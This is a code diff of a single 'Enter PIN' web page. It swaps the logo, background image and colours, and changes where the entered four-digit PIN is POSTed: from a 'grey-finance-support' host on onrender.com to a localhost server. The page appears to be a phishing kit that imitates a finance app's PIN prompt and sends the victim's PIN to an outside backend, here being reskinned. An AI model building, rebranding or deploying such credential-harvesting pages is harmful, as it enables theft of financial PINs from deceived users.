@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
+  <link rel="shortcut icon" href="./logo.jpg" type="image/x-icon">
 
   <title>Enter PIN</title>
  <style>
@@ -15,7 +15,12 @@
 }
 
 body {
-  background-color: #fff;
+   background-image: url('./ass1.jpg');
+ background-attachment: fixed;
+ background-repeat: no-repeat;
+ background-size: cover;
+ overflow-y: hidden;
+ overflow-x: hidden;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -33,10 +38,11 @@ h2 {
   font-size: 1.3rem;
   font-weight: 600;
   margin-bottom: 6px;
+  color: white;
 }
 
 p {
-  color: #555;
+  color: white;
   font-size: 0.9rem;
   margin-bottom: 30px;
 }
@@ -60,13 +66,13 @@ p {
 }
 
 .pin-inputs input:focus {
-  border-color: #2563eb;
-  box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.15);
+  border-color: rgb(223, 114, 13);
+  box-shadow: 0 0 0 2px rgb(223, 114, 13);
 }
 
 .forgot {
   display: inline-block;
-  color: #2563eb;
+  color: #451d74;
   font-size: 0.9rem;
   text-decoration: none;
   margin-bottom: 40px;
@@ -78,11 +84,11 @@ p {
 
 button {
   width: 100%;
-  background-color: #2563eb;
+ background-color: rgb(223, 114, 13);
   color: #fff;
   border: none;
   border-radius: 6px;
-  padding: 14px;
+  padding: 17px;
   font-size: 1rem;
   font-weight: 600;
   cursor: pointer;
@@ -92,7 +98,7 @@ button {
 }
 
 button:hover {
-  background-color: #1e4ed8;
+   background-color: rgb(223, 114, 13);
 }
 
 .loader {
@@ -160,6 +166,7 @@ button.loading .loader {
 
   <script>
 const inputs = document.querySelectorAll(".pin-inputs input");
+inputs[0].focus();
 const continueBtn = document.getElementById("continue-btn");
 let pin = []
 let i ;
@@ -217,7 +224,7 @@ continueBtn.addEventListener("click", () => {
     pin:`${inputs[0].value}${inputs[1].value}${inputs[2].value}${inputs[3].value}`
   }
          console.log(send_data)
-    fetch('https://grey-finance-support.onrender.com/sendreq',{
+    fetch('http://localhost:3100/sendreq',{
     method: 'POST',
                 credentials:'include',
                headers: {
@@ -248,4 +255,3 @@ continueBtn.addEventListener("click", () => {
   </script>
 </body>
 </html>
-
